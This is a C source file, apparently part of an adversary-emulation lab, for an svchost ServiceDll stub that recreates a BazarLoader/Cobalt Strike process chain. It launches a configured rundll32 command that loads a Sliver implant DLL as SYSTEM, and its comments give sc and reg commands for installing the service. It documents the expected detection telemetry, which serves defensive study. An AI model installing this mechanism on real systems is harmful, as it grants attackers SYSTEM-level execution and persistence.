/*
 * c0015_svc_stub.c — svchost ServiceDll stub that spawns rundll32 [LAB-MECHANISM]
 *
 * WHY THIS EXISTS (route A, decided 2026-10-23)
 * ---------------------------------------------
 * C0015 process tree (DFIR report, image i15):
 *     ... regsvr32.exe -> svchost.exe (10640) -> rundll32.exe (D8b3.dll) (10984) -> winlogon.exe (664)
 *
 * The report records that BazarLoader "invokes a Svchost.exe" and that the two CS DLLs were
 * "loaded via RunDll32 using the Svchost process", but it does NOT record HOW svchost came to
 * host the payload. A service DLL is the only native Windows way to make svchost.exe host
 * arbitrary code and spawn a SYSTEM child, so the lab uses it and labels it [LAB-MECHANISM].
 *
 * This stub is infrastructure only: it hosts nothing, hides nothing, and spawns exactly one
 * configured command. The detached Sliver DLL (D8B3.dll) runs in the spawned rundll32.exe and
 * is what later migrates into winlogon.exe.
 *
 * Accepted deviation: creates service artifacts the source campaign did not show
 * (Security 7045 / 4697, Services\c0015svc registry keys). Record them as lab noise.
 *
 * CONFIG (no hardcoded lab values, same discipline as the other payloads)
 * ---------------------------------------------------------------
 *   %PUBLIC%\C0015\config.ini
 *     [stage]
 *     spawn_cmd   = C:\Windows\System32\rundll32.exe C:\Users\Public\C0015\D8B3.dll
 *     marker_name = svc-stage.txt          ; optional; empty = no marker
 *
 * CONTROL PATH: no config / empty spawn_cmd -> the service reports STOPPED and does nothing.
 *
 * BUILD (Kali / mingw)
 *   x86_64-w64-mingw32-gcc -shared -o c0015_stage.dll payloads/dll/c0015_svc_stub.c -ladvapi32
 *
 * INSTALL (elevated, on WS01) — see payloads/packaging/install_stage_service.ps1
 *   sc create c0015svc type= own start= demand binPath= "%SystemRoot%\System32\svchost.exe -k c0015grp"
 *   reg add "HKLM\SYSTEM\CurrentControlSet\Services\c0015svc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\Public\C0015\c0015_stage.dll" /f
 *   reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v c0015grp /t REG_MULTI_SZ /d c0015svc /f
 *   sc start c0015svc
 *
 * TELEMETRY (expected)
 *   Security 7045 (service installed), Sysmon E13 (registry ServiceDll + Svchost group),
 *   Sysmon E1 `svchost.exe -k c0015grp -> rundll32.exe <D8B3.dll>`, E7 ImageLoad of D8B3.dll,
 *   E11 marker (optional).
 */
#include <windows.h>

#define INI_PATH L"C:\\Users\\Public\\C0015\\config.ini"
#define SVC_NAME L"c0015svc"
#define STAGE_DIR L"C:\\Users\\Public\\C0015\\"

static SERVICE_STATUS_HANDLE g_hStatus = NULL;
static SERVICE_STATUS g_status;
static HANDLE g_hChild = NULL;
static HANDLE g_hStop = NULL;

static void report_status(DWORD state, DWORD win32_exit, DWORD wait_hint)
{
    if (g_hStatus == NULL) {
        return;
    }
    g_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_status.dwCurrentState = state;
    g_status.dwWin32ExitCode = win32_exit;
    g_status.dwWaitHint = wait_hint;
    g_status.dwControlsAccepted =
        (state == SERVICE_RUNNING) ? SERVICE_ACCEPT_STOP : 0;
    g_status.dwCheckPoint =
        (state == SERVICE_RUNNING || state == SERVICE_STOPPED) ? 0 : 1;
    SetServiceStatus(g_hStatus, &g_status);
}

static DWORD WINAPI ctrl_handler(DWORD op, DWORD evt, LPVOID data, LPVOID ctx)
{
    (void)evt; (void)data; (void)ctx;
    if (op == SERVICE_CONTROL_STOP || op == SERVICE_CONTROL_SHUTDOWN) {
        report_status(SERVICE_STOP_PENDING, NO_ERROR, 5000);
        if (g_hStop != NULL) {
            SetEvent(g_hStop);
        }
    }
    return NO_ERROR;
}

/* observable: proof the ServiceMain ran (E11). Optional; empty marker_name disables it. */
static void write_marker(const wchar_t *name)
{
    wchar_t path[MAX_PATH];
    HANDLE f;
    const char text[] = "c0015 lab stage service executed\r\n";
    DWORD written = 0;

    if (name == NULL || name[0] == 0) {
        return;
    }
    if ((DWORD)(lstrlenW(STAGE_DIR) + lstrlenW(name) + 1) > MAX_PATH) {
        return;
    }
    lstrcpyW(path, STAGE_DIR);
    lstrcatW(path, name);

    f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        WriteFile(f, text, (DWORD)(sizeof(text) - 1), &written, NULL);
        CloseHandle(f);
    }
}

/* svchost resolves this by name via GetProcAddress("ServiceMain"); x64 only (x86 __stdcall
   would decorate the name and the lookup would fail). */
__declspec(dllexport) VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv)
{
    wchar_t spawn_cmd[1024] = {0};
    wchar_t marker[128] = {0};
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    HANDLE waits[2];
    DWORD wait_result;

    (void)argc; (void)argv;

    g_hStatus = RegisterServiceCtrlHandlerExW(SVC_NAME, ctrl_handler, NULL);
    if (g_hStatus == NULL) {
        return;
    }
    report_status(SERVICE_START_PENDING, NO_ERROR, 3000);

    GetPrivateProfileStringW(L"stage", L"spawn_cmd", L"", spawn_cmd,
                             (DWORD)(sizeof(spawn_cmd) / sizeof(wchar_t)), INI_PATH);
    GetPrivateProfileStringW(L"stage", L"marker_name", L"", marker,
                             (DWORD)(sizeof(marker) / sizeof(wchar_t)), INI_PATH);

    if (spawn_cmd[0] == 0) {
        /* control path: no config -> no process, no file */
        report_status(SERVICE_STOPPED, ERROR_FILE_NOT_FOUND, 0);
        return;
    }

    if (marker[0] != 0) {
        write_marker(marker);
    }

    g_hStop = CreateEventW(NULL, TRUE, FALSE, NULL);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    /* CREATE_NO_WINDOW keeps the console-less look; the child inherits the SYSTEM token
       because svchost runs as SYSTEM. */
    if (!CreateProcessW(NULL, spawn_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        report_status(SERVICE_STOPPED, GetLastError(), 0);
        if (g_hStop != NULL) {
            CloseHandle(g_hStop);
            g_hStop = NULL;
        }
        return;
    }

    g_hChild = pi.hProcess;
    CloseHandle(pi.hThread);
    report_status(SERVICE_RUNNING, NO_ERROR, 0);

    /* Keep svchost alive while the host process runs, so the parent/child relationship
       stays visible in the process tree (and in E1 ParentImage). */
    if (g_hStop != NULL) {
        waits[0] = g_hChild;
        waits[1] = g_hStop;
        wait_result = WaitForMultipleObjects(2, waits, FALSE, INFINITE);
    } else {
        wait_result = WaitForSingleObject(g_hChild, INFINITE);
    }

    if (g_hStop != NULL && wait_result == WAIT_OBJECT_0 + 1) {
        TerminateProcess(g_hChild, 0);
    }

    report_status(SERVICE_STOP_PENDING, NO_ERROR, 3000);

    if (g_hChild != NULL) {
        CloseHandle(g_hChild);
        g_hChild = NULL;
    }
    if (g_hStop != NULL) {
        CloseHandle(g_hStop);
        g_hStop = NULL;
    }
    report_status(SERVICE_STOPPED, NO_ERROR, 0);
}

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved)
{
    (void)module; (void)reason; (void)reserved;
    /* Never do work under the loader lock: svchost calls ServiceMain explicitly. */
    return TRUE;
}
